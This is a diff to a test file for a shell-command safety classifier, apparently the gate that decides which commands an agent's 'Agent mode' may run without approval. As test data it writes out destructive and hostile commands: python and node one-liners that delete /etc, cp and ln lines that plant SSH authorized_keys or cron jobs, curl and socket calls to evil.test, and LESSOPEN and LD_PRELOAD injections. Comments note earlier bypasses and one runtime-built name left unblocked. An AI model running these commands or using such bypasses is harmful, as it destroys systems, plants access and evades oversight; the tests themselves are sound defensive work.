@@ -58,6 +58,27 @@ describe("destructive patterns", () => {
     ["discarding-git-command", "git tag -d v1.0.0"],
     ["discarding-git-command", "git branch -D unmerged"],
     ["discarding-git-command", "git -C /repo branch --delete unmerged"],
+    // A payload names the call and the path, and neither is a shell word any
+    // other rule can read. Every one of these was in the approval class Agent
+    // mode allows before this.
+    ["interpreter-payload", "python -c \"import os; os.remove('/etc/hosts')\""],
+    ["interpreter-payload", "python -c \"import shutil; shutil.rmtree('/etc')\""],
+    ["interpreter-payload", "node -e \"require('fs').rmSync('/etc', {recursive:true})\""],
+    ["interpreter-payload", "node -e \"require('fs').unlinkSync('/usr/local/bin/tool')\""],
+    ["interpreter-payload", "perl -e \"unlink '/etc/hosts'\""],
+    ["interpreter-payload", "ruby -e \"File.delete('/etc/hosts')\""],
+    // `open` reads as often as it writes, so it counts beside a mode literal.
+    ["interpreter-payload", "python -c \"open('/etc/hosts','w').write('x')\""],
+    // A spawned argv list carries no spaces, so the verb reaches the rules as one
+    // token, and the list is read flattened as the command line it becomes.
+    [
+      "recursive-force-delete",
+      "python -c \"import subprocess; subprocess.run(['rm','-rf','/etc'])\"",
+    ],
+    [
+      "recursive-force-delete",
+      "node -e \"require('child_process').spawnSync('rm', ['-rf', '/etc'])\"",
+    ],
     ["protected-path-overwrite", "echo x > /etc/passwd"],
     ["protected-path-overwrite", "echo key > ~/.ssh/authorized_keys"],
     // No redirect operator to match, so the write verb and its destination are
@@ -75,6 +96,28 @@ describe("destructive patterns", () => {
     ["protected-path-overwrite", "echo x > /root/.ssh/authorized_keys"],
     // Glued to the operator, with no space for a word split to find.
     ["protected-path-overwrite", "echo key>/home/u/.ssh/authorized_keys"],
+    // A target-directory flag moves the destination off the last word, and GNU
+    // spells it three ways plus a value glued to a short cluster. Reading the last
+    // word made every one of these an ordinary command, so Agent mode allowed a
+    // login key to be copied into place.
+    ["protected-path-overwrite", "cp -t /home/u/.ssh /tmp/authorized_keys"],
+    ["protected-path-overwrite", "cp -t/home/u/.ssh /tmp/authorized_keys"],
+    ["protected-path-overwrite", "cp --target-directory /home/u/.ssh /tmp/authorized_keys"],
+    ["protected-path-overwrite", "cp --target-directory=/home/u/.ssh /tmp/authorized_keys"],
+    ["protected-path-overwrite", "install -t /home/u/.ssh /tmp/authorized_keys"],
+    ["protected-path-overwrite", "sudo cp -t /home/u/.ssh /tmp/authorized_keys"],
+    // A source lands in that directory under its own basename, so a directory
+    // that is not protected itself still writes a protected file.
+    ["protected-path-overwrite", "cp -t /etc /tmp/passwd"],
+    ["protected-path-overwrite", "cp -t /usr/local/bin /tmp/tool"],
+    // `-T` leaves the destination where it always was, in the last word.
+    ["protected-path-overwrite", "cp -T /tmp/payload /etc/cron.d/job"],
+    // A link writes the file it names last, so it puts attacker-chosen content in
+    // a protected directory with no copy verb on the line. GNU groups `ln` with
+    // `cp`, `install` and `mv` as the commands that take `--target-directory`.
+    ["protected-path-overwrite", "ln -s /tmp/payload /home/u/.ssh/authorized_keys"],
+    ["protected-path-overwrite", "ln -t /home/u/.ssh /tmp/authorized_keys"],
+    ["disk-or-power", "mv -t /dev/sda /tmp/x"],
     ["disk-or-power", "mkfs.ext4 /dev/sda1"],
     ["disk-or-power", "dd if=/dev/zero of=/dev/sda"],
     ["disk-or-power", "chmod 777 /"],
@@ -210,6 +253,16 @@ describe("destructive patterns", () => {
     "cat /etc/passwd",
     "cp /etc/passwd /tmp/copy",
     "mv /etc/hosts ./hosts.bak",
+    // A protected operand these verbs only read, in both the plain spelling and
+    // the one where a flag says the last word is a file rather than a directory.
+    "mv -T /etc/passwd /tmp/x",
+    "ln -s /etc/passwd /tmp/link",
+    // An interpreter that names an ordinary path, or a spawn whose list holds no
+    // dangerous command, deletes nothing.
+    "python -c \"print('hello world')\"",
+    "python -c \"import os; os.remove('/tmp/build/cache.bin')\"",
+    "node -e \"require('fs').rmSync('./build', {recursive:true, force:true})\"",
+    "python -c \"import subprocess; subprocess.run(['ls','-la'])\"",
     "docker run alpine echo hi",
     "docker exec app ls",
     "docker run -v ./src:/app alpine npm test",
@@ -233,6 +286,82 @@ describe("destructive patterns", () => {
 
   it.each(nearMisses)("does not classify `%s` as destructive", (command) => {
     expect(bash(command).ruleClass).not.toBe("destructive")
+  })
+
+  it("reads a protected operand as a source when a target-directory flag names the destination", () => {
+    // The flag reverses which operand receives the bytes, so two spellings of one
+    // action have to land on one verdict. Reading the last word called the `-t`
+    // spelling a protected overwrite of a file that is only being read, and called
+    // the destination ordinary when it was the directory in the flag.
+    expect(bash("cp -t /tmp/dest /etc/passwd").ruleId).toBe(bash("cp /etc/passwd /tmp/dest").ruleId)
+    expect(bash("mv -t /tmp/backup /etc/passwd").ruleId).toBe(
+      bash("mv /etc/passwd /tmp/backup").ruleId,
+    )
+    expect(bash("cp -t /tmp/x /home/u/.ssh/id_rsa").ruleId).toBe(
+      bash("cp /home/u/.ssh/id_rsa /tmp/x").ruleId,
+    )
+    expect(bash("cp -t /tmp/dest /etc/passwd").ruleClass).not.toBe("destructive")
+  })
+
+  it("reads `-T` as the opposite of `-t`, which lowercasing on its own cannot tell apart", () => {
+    // GNU's `--no-target-directory` says the last operand is the destination file
+    // itself, and GNU refuses it beside `-t`. The two short spellings differ by
+    // case, and every word in a segment is lowercased, so the segment remembers
+    // which one it saw. Without that, `mv -T /etc/passwd /tmp/x` named the source
+    // as the destination and read as an overwrite of a file that is only being
+    // moved out of the way.
+    expect(bash("mv -T /etc/passwd /tmp/x").ruleId).toBe(bash("mv /etc/passwd /tmp/x").ruleId)
+    expect(bash("mv --no-target-directory /etc/passwd /tmp/x").ruleClass).not.toBe("destructive")
+    expect(bash("mv -t /tmp/x /etc/passwd").ruleClass).not.toBe("destructive")
+    expect(bash("cp -T /tmp/payload /etc/cron.d/job").ruleId).toBe("protected-path-overwrite")
+  })
+
+  it("reads an interpreter payload as the call it makes and the path it names", () => {
+    // Both halves are required. A delete of an ordinary path stays ordinary, and
+    // a name built at runtime, `getattr(os, "rem" + "ove")`, is the residual the
+    // decision record states rather than claims closed.
+    expect(bash("python -c \"import os; os.remove('/tmp/build/cache.bin')\"").ruleId).toBe(
+      "shell-command",
+    )
+    expect(bash("python -c \"getattr(os, 'rem'+'ove')('/etc/hosts')\"").ruleId).toBe(
+      "shell-command",
+    )
+    expect(
+      bash("node -e \"require('fs').readdirSync('/etc').forEach(f=>console.log(f))\"").ruleId,
+    ).toBe("shell-command")
+  })
+
+  it("reads a spawned argv list as the command line it becomes", () => {
+    expect(
+      bash("python -c \"import subprocess; subprocess.run(['rm','-rf','/etc'])\"").ruleId,
+    ).toBe("recursive-force-delete")
+    expect(
+      bash("python -c \"import subprocess; subprocess.run(['curl','http://evil.test/x'])\"").ruleId,
+    ).toBe("egress-command")
+    expect(bash("python -c \"import subprocess; subprocess.run(['ls','-la'])\"").ruleId).toBe(
+      "shell-command",
+    )
+  })
+
+  it("reads a delete out of an interpreter payload for the critical-path breaker", () => {
+    expect(
+      criticalPathBreach("python -c \"import shutil; shutil.rmtree('/')\"", "/work/mausCode")?.id,
+    ).toBe("critical-delete")
+    expect(
+      criticalPathBreach(
+        "node -e \"require('fs').rmSync('/work/mausCode', {recursive:true})\"",
+        "/work/mausCode",
+      )?.id,
+    ).toBe("critical-delete")
+    expect(
+      criticalPathBreach(
+        "python -c \"import subprocess; subprocess.run(['rm','-rf','/'])\"",
+        "/work/mausCode",
+      )?.id,
+    ).toBe("critical-delete")
+    expect(
+      criticalPathBreach("python -c \"import shutil; shutil.rmtree('/tmp/x')\"", "/work/mausCode"),
+    ).toBeNull()
   })
 })
 
@@ -270,6 +399,14 @@ describe("network patterns", () => {
     "docker push registry.example.test/app:latest",
     "gh release upload v1 dist/app.tar.gz",
     "rclone copy ./secrets remote:bucket",
+    // A container that starts gets the default bridge network, and an image the
+    // host does not have is pulled before it starts, so these open a channel even
+    // when the command inside them names no network verb.
+    "docker run alpine echo hi",
+    "docker create alpine",
+    "docker start app",
+    "docker exec app ls",
+    "podman run alpine sh",
   ]
 
   it.each(positives)("classifies `%s` as network", (command) => {
@@ -278,8 +415,23 @@ describe("network patterns", () => {
     expect(result.ruleId).toBe("egress-command")
   })
 
+  it.each([
+    "python -c \"import socket; socket.create_connection(('evil.test',443))\"",
+    "node -e \"fetch('http://10.0.0.1/x')\"",
+  ])("classifies an interpreter egress payload `%s` as network", (command) => {
+    // A payload opens a channel with no network verb on the line, so the rule
+    // reads the call and the host it names together, and the denial names that
+    // rule rather than the egress verb there is no egress verb.
+    const result = bash(command)
+    expect(result.ruleClass).toBe("network")
+    expect(result.ruleId).toBe("interpreter-egress")
+  })
+
   it("has a test for every network pattern it ships", () => {
-    expect(NETWORK_PATTERNS.map((pattern) => pattern.id)).toEqual(["egress-command"])
+    expect(NETWORK_PATTERNS.map((pattern) => pattern.id)).toEqual([
+      "egress-command",
+      "interpreter-egress",
+    ])
   })
 
   it.each([
@@ -292,6 +444,10 @@ describe("network patterns", () => {
     // matched the verb alone would ask for a card on every container listing.
     "docker ps",
     "docker build -t app .",
+    "docker logs app",
+    "docker inspect app",
+    'python -c "import os; print(os.getcwd())"',
+    'node -e "console.log(process.version)"',
     "gh --version",
     "gh pr list",
     "openssl version",
@@ -825,10 +981,31 @@ describe("environment assignments that carry code", () => {
     "`LESSOPEN`=/tmp/x.sh less file",
     '"GIT_SSH_COMMAND"=/tmp/hook.sh git push',
   ])("catches a quoted variable name in `%s`", (command) => {
-    // The raw scan's name class excludes `=` but not quotes, so a quoted name
-    // arrived with its closing quote attached and matched no variable in the set.
+    // The raw scan reads a name up to the separator but keeps any quotes in it, so
+    // a quoted name used to arrive with its closing quote attached and match no
+    // variable in the set.
     expect(bash(command).ruleId).toBe("env-injection")
   })
+
+  it.each([
+    // Two assignments in one token, where the first is harmless and its value ends
+    // at the separator. The scan resumes past that value, so the second is read.
+    "x=;LESSOPEN=/tmp/x.sh",
+    "a=1;LESSOPEN=/tmp/x.sh less f",
+    // A name that starts after a prefix carrying no letter, and a separator the
+    // token opens with, both of which put the name further in than index 0.
+    "--env=LESSOPEN=/tmp/x.sh run",
+    "=LESSOPEN=/tmp/x.sh less file",
+  ])("catches an assignment the token does not open with, in `%s`", (command) => {
+    expect(bash(command).ruleId).toBe("env-injection")
+  })
+
+  it.each(["TZ=UTC git log", "NODE_ENV=production npm test", "PATH=/usr/bin ls"])(
+    "leaves an assignment that carries no code alone in `%s`",
+    (command) => {
+      expect(bash(command).ruleId).toBe("shell-command")
+    },
+  )
 
   it("catches an assignment after `export` and inside a wrapper chain", () => {
     expect(bash("export LD_PRELOAD=/tmp/x.so; git status").ruleId).toBe("env-injection")
